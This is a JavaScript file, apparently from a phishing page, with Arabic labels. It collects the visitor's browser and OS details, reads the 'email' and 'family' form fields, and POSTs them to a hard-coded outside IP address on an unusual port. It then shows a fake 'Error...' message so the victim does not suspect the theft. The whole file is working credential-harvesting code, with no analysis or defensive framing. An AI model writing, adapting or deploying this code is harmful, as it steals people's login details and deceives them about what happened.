let clientIP;
let deviceInfo = {};

function getDeviceDetails() {
  const ua = navigator.userAgent;

  let os = "غير معروف", osVersion = "غير معروف", browser = "غير معروف", browserVersion = "غير معروف";

  if (/Windows NT/.test(ua)) { os = "Windows"; osVersion = ua.match(/Windows NT ([0-9.]+)/)?.[1]; }
  else if (/Android/.test(ua)) { os = "Android"; osVersion = ua.match(/Android ([0-9.]+)/)?.[1]; }
  else if (/iPhone|iPad/.test(ua)) { os = "iOS"; osVersion = ua.match(/OS ([0-9_]+)/)?.[1]?.replace(/_/g, "."); }
  else if (/Mac OS X/.test(ua)) { os = "macOS"; osVersion = ua.match(/Mac OS X ([0-9_]+)/)?.[1]?.replace(/_/g, "."); }

  if (/Edg/.test(ua)) { browser = "Edge"; browserVersion = ua.match(/Edg\/([0-9.]+)/)?.[1]; }
  else if (/Chrome/.test(ua)) { browser = "Chrome"; browserVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1]; }
  else if (/Firefox/.test(ua)) { browser = "Firefox"; browserVersion = ua.match(/Firefox\/([0-9.]+)/)?.[1]; }
  else if (/Safari/.test(ua)) { browser = "Safari"; browserVersion = ua.match(/Version\/([0-9.]+)/)?.[1]; }

  let deviceType = /iPad|Tablet/.test(ua) ? "تابلت" : /Mobi|Android|iPhone/.test(ua) ? "جوال" : "كمبيوتر";

  deviceInfo = { deviceType, os, osVersion, browser, browserVersion };
}

getDeviceDetails();

function the_error() {
    const name = document.getElementById("email").value;
    const family = document.getElementById("family").value;

    fetch("http://212.227.64.179:10767/", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name, family, ip: "placeholder-for-ip", device: deviceInfo })
    })
    .then(res => res.text())
    .then(data => console.log("SERVER RESPONSE:", data))
    .catch(err => console.error("ERROR:", err));

    document.getElementById("error").textContent = "Error...";
}
